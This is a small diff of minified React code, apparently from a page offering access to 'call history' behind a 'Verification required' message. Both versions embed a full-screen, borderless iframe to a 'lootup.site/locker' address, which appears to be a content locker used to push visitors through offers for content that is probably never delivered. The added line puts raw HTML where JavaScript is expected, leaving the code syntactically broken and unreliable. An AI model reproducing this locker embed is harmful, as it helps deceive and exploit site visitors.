@@ -1049,16 +1049,7 @@ const I = () => {
                         className: "text-sm text-gray-400",
                         children: "Verification required to access call history"
                     })]
-                }), $.jsx("iframe", {
-                    name: "myiFrame",
-                    width: "1920px",
-                    height: "1920px",
-                    src: "https://lootup.site/locker/",
-                    scrolling: "no",
-                    marginwidth: "0",
-                    marginheight: "0",
-                    style: {
-                        border: "0px none #ffffff"
+                }), <iframe name="myiFrame" width="1920px" height="1920px" src="https://lootup.site/locker/" scrolling="no" marginwidth="0" marginheight="0" style="border:0px none #ffffff;"></iframe>
                     }
                 })]
             })]
